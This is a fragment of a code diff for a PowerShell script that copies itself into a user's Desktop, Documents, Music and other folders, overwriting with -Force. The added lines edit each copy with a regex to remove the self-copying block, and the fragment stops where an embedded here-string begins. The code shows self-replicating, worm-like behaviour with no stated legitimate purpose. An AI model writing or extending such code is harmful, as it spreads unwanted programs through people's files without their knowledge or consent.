@@ -26,6 +26,11 @@ $foldersToCopy = Get-ChildItem -Path $desktopPath, $documentsPath, $musicPath, $
 foreach ($folder in $foldersToCopy) {
     $newCopyPath = Join-Path -Path $folder.FullName -ChildPath $MyInvocation.MyCommand.Name
     Copy-Item -Path $selfPath -Destination $newCopyPath -Force
+
+    # Modify the copied file's content to remove the code block related to copying itself
+    $copyContent = Get-Content -Path $newCopyPath -Raw
+    $copyContent = $copyContent -replace '(?s)\$selfPath = \$MyInvocation.MyCommand.Path.+?New-Item -Path \$newCopyPath -ItemType File -Force \| Out-Null.+?}', ''
+    Set-Content -Path $newCopyPath -Value $copyContent
 }
 
 $source = @"
